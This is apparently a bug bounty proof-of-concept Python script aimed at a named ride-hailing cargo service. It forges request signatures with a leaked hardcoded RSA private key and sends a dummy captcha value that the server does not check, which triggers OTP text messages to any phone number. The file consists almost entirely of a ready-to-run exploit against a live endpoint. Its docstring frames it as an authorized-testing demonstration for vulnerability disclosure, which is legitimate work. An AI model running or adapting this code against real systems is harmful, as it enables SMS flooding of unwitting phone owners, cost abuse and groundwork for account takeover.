"""
request_otp.py

Demonstrates Vulnerabilities #1 and #2:
 - Forges a valid X-Signature using the hardcoded RSA private key
 - Passes a placeholder value in the `captcha` field, which the server
   never validates, to trigger a real OTP SMS to any phone number.

Only use against phone numbers you are explicitly authorized to test
(e.g. your own test number) under the terms of the relevant bug bounty
program.
"""

import requests
from extract_key import load_private_key, sign, JWK

# Test number used for authorized PoC verification only.
VICTIM_PHONE = "7001234567"
COUNTRY_CODE = "7"

ENDPOINT = "https://cargo.indrive.com/proxy/auth/request-code"


def request_otp(phone: str, phone_code: str):
    private_key = load_private_key(JWK)
    payload = {
        "phone": phone,
        "phoneCode": phone_code,
        "captcha": "x",  # arbitrary value -- never validated server-side
        "locale": "en",
    }
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://cargo.indrive.com",
        "x-signature": sign(payload, private_key),
    }
    response = requests.post(ENDPOINT, json=payload, headers=headers, timeout=10)
    return response


if __name__ == "__main__":
    r = request_otp(VICTIM_PHONE, COUNTRY_CODE)
    print(r.status_code, r.text)
    if r.ok:
        auth_id = r.json().get("auth_id")
        print("auth_id:", auth_id)
